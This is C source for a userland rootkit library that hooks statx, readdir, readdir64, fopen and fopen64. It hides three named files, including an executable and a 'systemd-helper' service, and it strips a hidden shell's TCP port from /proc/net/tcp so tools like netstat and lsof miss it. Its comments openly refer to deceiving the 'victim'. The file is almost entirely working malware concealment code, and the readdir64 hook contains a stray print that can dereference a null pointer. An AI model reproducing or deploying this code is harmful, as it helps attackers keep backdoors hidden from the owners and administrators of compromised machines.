#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
#include <string.h>
#include <sys/stat.h>
#include <dirent.h>
#include <sys/types.h>
#include <errno.h>

#define SHELL_PORT "FE63"

/* Hooking the statx system call prevents the victim from finding our executable even if they know the path
 * and also prevents tab autocompletion from showing the file
 *
 * Signature from "man statx(2)" 
 */
int statx(int dirfd, const char *restrict pathname, int flags,
          unsigned int mask, struct statx *restrict statxbuf) {
    // Check if the pathname contains the name of one of our files
    if (strstr(pathname, "l32") != NULL || // our executable
        strstr(pathname, "systemd-helper") != NULL || // our systemd service
        strstr(pathname, "libc.lib32.so.6") != NULL) { // our shared library
        // If so, return error status code ENOENT: path does not exist
        errno = ENOENT;
        return -1;
    } else {
        // Otherwise, return the expected result

        // Obtain and store the address of the original statx
        int (*statx_old)(int dirfd, const char *restrict pathname, int flags,
                unsigned int mask, struct statx *restrict statxbuf);
        statx_old = dlsym(RTLD_NEXT, "statx");

        // Call original function to obtain information about the requested path and return the result
        return statx_old(dirfd, pathname, flags, mask, statxbuf);
    }
}

/* Hooking the dirent64 system call prevents the victim from finding our executable when they use the ls command
 *
 * Signature from "man readdir(3)" (does not mention the 64 version (on my machine))
*/
struct dirent64 *readdir64(DIR *dirp) {
    // Obtain and store the address of the original readdir64
    struct dirent64 *(*readdir64_old)(DIR *dirp);
    readdir64_old = dlsym(RTLD_NEXT, "readdir64");

    struct dirent64 *result;

    // Call original function to obtain information about the current file of the DIR stream
    result = readdir64_old(dirp);
    // If we reached the end of the DIR stream result is NULL
    if (result != NULL) {
        // Check if the current file is one of our files
        if (strstr(result->d_name, "l32") != NULL || // our executable
            strstr(result->d_name, "systemd-helper") != NULL || // our systemd service
            strstr(result->d_name, "libc.lib32.so.6") != NULL) { // our shared library
            // If so, replace result with the next file so it's not shown
            result = readdir64_old(dirp);
            puts(result->d_name);
        }
    }

    return result;
}

/* Hooking the dirent system call prevents the victim from finding our executable when they use the ls command
 *
 * Signature from "man readdir(3)"
*/
struct dirent *readdir(DIR *dirp) {
    // Obtain and store the address of the original readdir
    struct dirent *(*readdir_old)(DIR *dirp);
    readdir_old = dlsym(RTLD_NEXT, "readdir");

    struct dirent *result;

    // Call original function to obtain information about the current file of the DIR stream
    result = readdir_old(dirp);
    // If we reached the end of the DIR stream result is NULL
    if (result != NULL) {
        // Check if the current file is one of our files
        if (strstr(result->d_name, "l32") != NULL || // our executable
            strstr(result->d_name, "systemd-helper") != NULL || // our systemd service
            strstr(result->d_name, "libc.lib32.so.6") != NULL) { // our shared library
            // If so, replace result with the next file so it's not shown
            result = readdir_old(dirp);
        }
    }

    return result;
}

/* Hooking the fopen64 system call prevents the victim from finding our opened TCP socket
 * when using tools such as netstat or lsof.
 * We accomplish this by detecting when /proc/net/tcp is opened, which contains information about TCP connections.
 * When our port (in hexadecimal notation) exists in a line we remove it from the result.
 *
 * Signature from "man fopen(3)"
 */
FILE *fopen64(const char *pathname, const char *mode) {
    // Obtain and store the address of the original fopen64
    FILE *(*fopen64_old)(const char *pathname, const char *mode);
    fopen64_old = dlsym(RTLD_NEXT, "fopen64");

    // Check if we open the file containing our open TCP socket
    if (strstr(pathname, "/proc/net/tcp") != NULL) {
        // Create file to store the edited output
        FILE *result = tmpfile64();
        // Open the original file
        FILE *content = fopen64_old(pathname, mode);

        char line[256];
        // Iterate over the lines of the original file
        while (fgets(line, sizeof(line), content) != NULL) {
            // Only add the line to the result if it does not contain our port
            if (strstr(line, SHELL_PORT) == NULL) {
                fputs(line, result);
            }
        }

        // set the file position indicator to the beginning, otherwise programs can't read from it
        rewind(result);
        return result;
    } else {
        // Use the original fopen64 for any other file
        FILE *result = fopen64_old(pathname, mode);
        return result;
    }
}

/* Hooking the fopen system call prevents the victim from finding our opened TCP socket
 * when using tools such as netstat or lsof.
 * We accomplish this by detecting when /proc/net/tcp is opened, which contains information about TCP connections.
 * When our port (in hexadecimal notation) exists in a line we remove it from the result.
 *
 * Signature from "man fopen(3)"
 */
FILE *fopen(const char *pathname, const char *mode) {
    // Obtain and store the address of the original fopen
    FILE *(*fopen_old)(const char *pathname, const char *mode);
    fopen_old = dlsym(RTLD_NEXT, "fopen");

    // Check if we open the file containing our open TCP socket
    if (strstr(pathname, "/proc/net/tcp") != NULL) {
        // Create file to store the edited output
        FILE *result = tmpfile();
        // Open the original file
        FILE *content = fopen_old(pathname, mode);

        char line[256];
        // Iterate over the lines of the original file
        while (fgets(line, sizeof(line), content) != NULL) {
            // Only add the line to the result if it does not contain our port
            if (strstr(line, SHELL_PORT) == NULL) {
                fputs(line, result);
            }
        }

        // set the file position indicator to the beginning, otherwise programs can't read from it
        rewind(result);
        return result;
    } else {
        // Use the original fopen for any other file
        FILE *result = fopen_old(pathname, mode);
        return result;
    }
}
